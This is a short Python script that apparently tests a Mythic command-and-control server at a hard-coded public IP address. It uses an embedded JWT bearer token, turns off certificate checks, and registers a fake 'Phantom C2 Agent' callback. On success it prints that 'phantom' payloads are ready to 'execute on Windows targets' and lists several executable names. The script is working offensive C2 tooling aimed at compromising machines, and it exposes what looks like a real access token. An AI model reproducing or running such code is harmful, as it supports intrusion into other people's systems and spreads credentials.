#!/usr/bin/env python3
import requests
import json
import urllib3
urllib3.disable_warnings()

MYTHIC_URL = "https://37.27.249.191:7443"
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxMTExMDUsImlhdCI6MTc1MDA5NjcwNSwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjcsIm9wZXJhdGlvbl9pZCI6MH0.3VtxYzD2_mGCV4NbggbmNXpq2tEfjvwnRypraq_yBlw"

def test_corrected_createcallback():
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {JWT_TOKEN}",
    }
    
    query = {
        "query": """
        mutation createCallback($newCallback: newCallbackConfig!, $payloadUuid: String!) {
            createCallback(newCallback: $newCallback, payloadUuid: $payloadUuid) {
                status
                error
            }
        }
        """,
        "variables": {
            "newCallback": {
                "ip": "127.0.0.1",
                "host": "phantom-test-host", 
                "user": "phantom-user",
                "description": "Phantom C2 Agent Test",
                "domain": "",
                "externalIp": "127.0.0.1",
                "extraInfo": "OS:windows ARCH:amd64 PID:1234",
                "processName": "explorer.exe",
                "sleepInfo": "5s"
            },
            "payloadUuid": "phantom-test-uuid-12345"
        }
    }
    
    response = requests.post(f"{MYTHIC_URL}/graphql/", headers=headers, json=query, verify=False)
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text}")
    
    if response.status_code == 200:
        data = response.json()
        if "errors" not in data or len(data.get("errors", [])) == 0:
            print("✓ createCallback working correctly!")
            return True
    
    return False

if __name__ == "__main__":
    print("Testing corrected createCallback mutation")
    print("=" * 50)
    success = test_corrected_createcallback()
    if success:
        print("\n🎯 PHANTOM PAYLOADS ARE READY!")
        print("Execute these on Windows targets:")
        print("- phantom_final_jwt_x64.exe")
        print("- phantom_jwt_updated_x64.exe") 
        print("- phantom_jwt_x64.exe")
        print("- phantom_jwt_x32.exe")
    else:
        print("\n❌ Still have schema issues")